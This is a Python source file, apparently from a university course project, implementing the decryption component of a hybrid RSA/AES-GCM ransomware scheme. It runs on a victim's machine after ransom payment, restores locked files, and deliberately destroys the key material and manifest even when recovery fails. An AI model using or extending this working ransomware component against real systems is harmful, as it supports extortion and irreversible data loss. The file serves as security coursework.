#!/usr/bin/env python3
# =============================================================================
# CSCE 5550 -Ransomware Project
# ransomware_decrypt.py  --  the DECRYPTION component of the hybrid schema.
#
# Runs on the VICTIM machine AFTER the ransom has been paid. Per the project
# description, the decryption component is transferred to the victim once
# the ransom is paid: the attacker sends ransomware_decrypt.py together
# with the RSA PRIVATE key (ransom_private.pem).
#
# Usage (recommended flow - attacker sends the private key file):
#   python3 ransomware_decrypt.py <target_dir> <private_key.pem> [--euid EUID]
#
# Alternative: the private key can be HARDCODED below in PRIVATE_KEY_PEM
# (paste the content of ransom_private.pem). If a key file is passed on the
# command line, the file wins over the hardcoded constant.
#
# What it does:
#   1. Reads key.bin.enc and unwraps the AES-256 session key with the
#      attacker's RSA private key (RSA-OAEP) - only possible after payment,
#      because only the attacker holds this key.
#   2. Recursively finds every *.locked_<EUID> file, parses its header
#      (MAGIC | NONCE | TAG | CIPHERTEXT), decrypts it with AES-256-GCM and
#      restores the original file name and content.
#      decrypt_one_file() also verifies the GCM authentication tag, so any
#      tampered/corrupted ciphertext is REJECTED (integrity guarantee).
#   3. Compares the SHA-256 of every restored file with the pre-encryption
#      manifest (.integrity_manifest.json) and reports PASS/FAIL, proving a
#      lossless encryption/decryption round trip.
#      - A restored file whose hash does not match is reported as FAIL.
#      - A manifest entry whose file was never restored (tampered/locked
#        file rejected by GCM, or deleted after encryption) is reported as
#        an explicit FAIL (missing) instead of crashing with an unhandled
#        FileNotFoundError.
#   4. CLEANUP IS UNCONDITIONAL: key.bin.enc, README_RESTORE.txt and the
#      integrity manifest are ALWAYS removed, even when decryption or
#      verification FAIL. The cleanup runs inside a try/finally block, so
#      it executes regardless of errors, sys.exit() calls or exceptions.
#      Consequence (by design): once the decryptor has run, the victim has
#      no second chance - tampered files are mathematically unrecoverable
#      (GCM tag) and the wrapped session key / manifest are destroyed.
# =============================================================================

import os
import sys
import json
import hashlib
import argparse

from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

# =============================================================================
# OPTIONAL HARDCODED ATTACKER PRIVATE KEY (sk)
# Default is None: the attacker normally transfers ransom_private.pem to the
# victim after the ransom is paid (this matches the project description).
# To hardcode instead, paste the full content of ransom_private.pem here,
# including the BEGIN/END lines, between the triple quotes.
# =============================================================================

PRIVATE_KEY_PEM = None

# --------------------------- customization ----------------------------------
# Must match the value used by ransomware_encrypt.py.
EUID = 'EUID'

# ------------------------------ constants ------------------------------------
MAGIC = b'CRLOCK1!'          # must match the encryptor's marker
NONCE_LEN = 12
TAG_LEN = 16
KEY_FILE = 'key.bin.enc'
MANIFEST_FILE = '.integrity_manifest.json'
NOTE_FILE = 'README_RESTORE.txt'


# Same scope guard as the encryptor: only critical_<EUID> is processed.
def validate_target(target_dir, euid):
    expected = 'critical_' + euid
    actual = os.path.basename(os.path.abspath(target_dir))
    if actual != expected:
        sys.exit('[SCOPE GUARD] refusing to run: expected directory "%s", '
                 'got "%s".' % (expected, actual))


# Resolve the RSA private key: the file sent by the attacker (command line)
# takes priority; otherwise fall back to the hardcoded PRIVATE_KEY_PEM.
def load_private_key(private_key_path):
    if private_key_path is not None:
        # Normal flow: attacker transferred ransom_private.pem after payment.
        if not os.path.isfile(private_key_path):
            sys.exit('[error] private key file not found: %s' % private_key_path)
        with open(private_key_path, 'rb') as f:
            pem = f.read()
    elif PRIVATE_KEY_PEM is not None:
        # Alternative: key hardcoded in this script by the attacker.
        pem = PRIVATE_KEY_PEM.encode()
    else:
        sys.exit('[error] no private key available. Either pass the key file '
                 'sent by the attacker (python3 ransomware_decrypt.py <dir> '
                 'ransom_private.pem) or hardcode it in PRIVATE_KEY_PEM.')
    try:
        return RSA.import_key(pem)
    except ValueError:
        sys.exit('[error] the private key is not valid PEM RSA - check the '
                 'file/hardcoded content.')


# Recover the AES session key from key.bin.enc using the RSA secret key.
# This is the step that is impossible before the ransom is paid: without
# the private key, the RSA-OAEP wrapping cannot be reversed.
def unwrap_session_key(target_dir, rsa_priv):
    with open(os.path.join(target_dir, KEY_FILE), 'rb') as f:
        wrapped = f.read()
    cipher = PKCS1_OAEP.new(rsa_priv)
    return cipher.decrypt(wrapped)            # -> 32-byte AES-256 session key


# Decrypt a single *.locked_EUID file and restore the original name.
# Header layout: MAGIC(8) | NONCE(12) | TAG(16) | CIPHERTEXT
# Returns the restored path. Raises ValueError if the GCM tag check fails
# (file was tampered with or the key is wrong).
def decrypt_one_file(locked_path, session_key, ext):
    with open(locked_path, 'rb') as f:
        blob = f.read()

    if blob[:len(MAGIC)] != MAGIC:
        raise ValueError('not an encrypted file of this tool: %s' % locked_path)

    nonce = blob[len(MAGIC):len(MAGIC) + NONCE_LEN]
    tag = blob[len(MAGIC) + NONCE_LEN:len(MAGIC) + NONCE_LEN + TAG_LEN]
    ciphertext = blob[len(MAGIC) + NONCE_LEN + TAG_LEN:]

    cipher = AES.new(session_key, AES.MODE_GCM, nonce=nonce, mac_len=TAG_LEN)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)  # verifies tag

    original_path = locked_path[:-len(ext)]  # strip the .locked_EUID suffix
    with open(original_path, 'wb') as f:
        f.write(plaintext)
    os.remove(locked_path)                   # remove the encrypted copy
    return original_path


# UNCONDITIONAL cleanup: removes key.bin.enc, README_RESTORE.txt and the
# integrity manifest from the target directory. Called from a finally block,
# so it runs whether decryption/verification succeeded, failed, or crashed.
# After this, the victim has no material left to retry or re-verify a
# recovery: tampered files are unrecoverable by design.
def cleanup_artifacts(target_dir):
    for artifact in (KEY_FILE, NOTE_FILE, MANIFEST_FILE):
        artifact_path = os.path.join(target_dir, artifact)
        if os.path.exists(artifact_path):
            try:
                os.remove(artifact_path)
                print('  [clean] removed artifact: %s' % artifact)
            except OSError as e:
                print('  [!] could not remove %s: %s' % (artifact, e))


def main():
    parser = argparse.ArgumentParser(
        description='CSCE 5550 project: ransomware decryption component.')
    parser.add_argument('target_dir', help='encrypted directory (critical_EUID)')
    parser.add_argument('private_key', nargs='?', default=None,
                        help='private key file sent by the attacker after '
                             'payment (optional if hardcoded in PRIVATE_KEY_PEM)')
    parser.add_argument('--euid', default=EUID, help='override the EUID')
    args = parser.parse_args()

    euid = args.euid
    ext = '.locked_' + euid

    validate_target(args.target_dir, euid)
    if not os.path.isdir(args.target_dir):
        sys.exit('[error] target directory does not exist: %s' % args.target_dir)

    # ---- 1) load the private key and unwrap the AES session key --------------
    # Errors at THIS stage exit WITHOUT cleanup: if the private key is wrong
    # the attacker may still retry with the correct one, and key.bin.enc is
    # the only copy of the wrapped session key.
    rsa_priv = load_private_key(args.private_key)
    try:
        session_key = unwrap_session_key(args.target_dir, rsa_priv)
    except FileNotFoundError:
        sys.exit('[error] %s not found in %s - nothing to decrypt here.'
                 % (KEY_FILE, args.target_dir))
    except ValueError:
        sys.exit('[error] unwrapping failed: wrong private key for this victim.')
    print('[decryptor] session key unwrapped (%d bytes).' % len(session_key))

    decrypt_failures = 0
    verify_failures = 0

    # ---- 2) + 3) decryption and verification ---------------------------------
    # Everything below runs inside try/finally: the finally block performs
    # the UNCONDITIONAL artifact cleanup, so it executes even on FAIL
    # results, sys.exit() calls or unexpected exceptions.
    try:
        locked_files = []
        for root, dirs, files in os.walk(args.target_dir):
            for name in sorted(files):
                if name.endswith(ext):
                    locked_files.append(os.path.join(root, name))

        if not locked_files:
            sys.exit('[decryptor] no %s files found - already decrypted?' % ext)

        for i, locked in enumerate(locked_files, 1):
            try:
                restored = decrypt_one_file(locked, session_key, ext)
                print('  [%d/%d] restored %s' %
                      (i, len(locked_files),
                       os.path.relpath(restored, args.target_dir)))
            except ValueError as e:
                # GCM tag check failed: the file was tampered with (or the
                # key is wrong). The locked file is left in place.
                decrypt_failures += 1
                print('  [%d/%d] FAILED  %s (%s)' %
                      (i, len(locked_files),
                       os.path.relpath(locked, args.target_dir), e))

        # ---- 3) verify lossless recovery against the pre-encryption manifest --
        # Missing files (never restored because tampered or deleted) are
        # reported as explicit FAILs, not crashes.
        manifest_path = os.path.join(args.target_dir, MANIFEST_FILE)
        if os.path.exists(manifest_path):
            with open(manifest_path) as f:
                manifest = json.load(f)
            for rel, info in sorted(manifest.items()):
                path = os.path.join(args.target_dir, rel)
                try:
                    with open(path, 'rb') as f:
                        digest = hashlib.sha256(f.read()).hexdigest()
                except FileNotFoundError:
                    verify_failures += 1
                    print('  verify %-40s FAIL (missing - never restored)' % rel)
                    continue
                ok = (digest == info['sha256'])
                if not ok:
                    verify_failures += 1
                print('  verify %-40s %s' % (rel, 'PASS' if ok else 'FAIL'))
        else:
            print('[decryptor] no integrity manifest found - skipped verification.')

    finally:
        # ---- 4) UNCONDITIONAL cleanup: always runs, even on failure ----------
        cleanup_artifacts(args.target_dir)

    # ---- 5) final report and exit code ----------------------------------------
    if decrypt_failures or verify_failures:
        sys.exit('[decryptor] recovery INCOMPLETE: %d decryption failure(s), '
                 '%d verification failure(s). Key material and manifest were '
                 'destroyed - tampered/missing files cannot be recovered.'
                 % (decrypt_failures, verify_failures))
    print('[decryptor] recovery complete: all files restored and verified, '
          'artifacts cleaned up.')


if __name__ == '__main__':
    main()
